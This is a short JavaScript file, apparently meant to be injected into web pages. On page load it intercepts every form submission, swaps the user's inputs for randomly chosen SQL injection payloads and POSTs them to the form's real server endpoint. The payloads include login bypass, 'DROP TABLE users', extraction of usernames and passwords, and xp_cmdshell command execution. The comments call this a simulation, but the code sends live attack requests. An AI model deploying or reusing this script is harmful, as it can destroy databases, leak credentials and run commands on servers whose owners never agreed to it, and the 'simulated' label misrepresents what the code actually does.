// Simulated SQL injection attacks that would trigger security alerts

// Collect form inputs
document.addEventListener('DOMContentLoaded', function() {
    // Attach to all forms
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        forms[i].addEventListener('submit', function(e) {
            e.preventDefault();
            injectSQL(this);
        });
    }
});

function injectSQL(form) {
    // Extract form inputs
    var inputs = form.getElementsByTagName('input');
    var data = {};
    
    for (var i = 0; i < inputs.length; i++) {
        var input = inputs[i];
        if (input.name) {
            // Insert SQL injection payloads
            data[input.name] = sqlInjectionPayloads(input.value);
        }
    }
    
    // Simulate sending to server
    simulateRequest(form.action, data);
}

function sqlInjectionPayloads(value) {
    // Generate SQL injection patterns that would trigger security alerts
    var payloads = [
        value + "' OR '1'='1",
        value + "'; DROP TABLE users; --",
        value + "' UNION SELECT username, password FROM users; --",
        value + "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) y); --",
        value + "'; exec xp_cmdshell('dir'); --",
        value + "' OR 1=1 --",
        value + "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' --"
    ];
    
    // Return a random payload
    return payloads[Math.floor(Math.random() * payloads.length)];
}

function simulateRequest(url, data) {
    console.log("Simulated SQL injection attack to " + url);
    console.log("Payload: ", JSON.stringify(data));
    
    // Simulate XHR request with malicious payloads
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(data));
}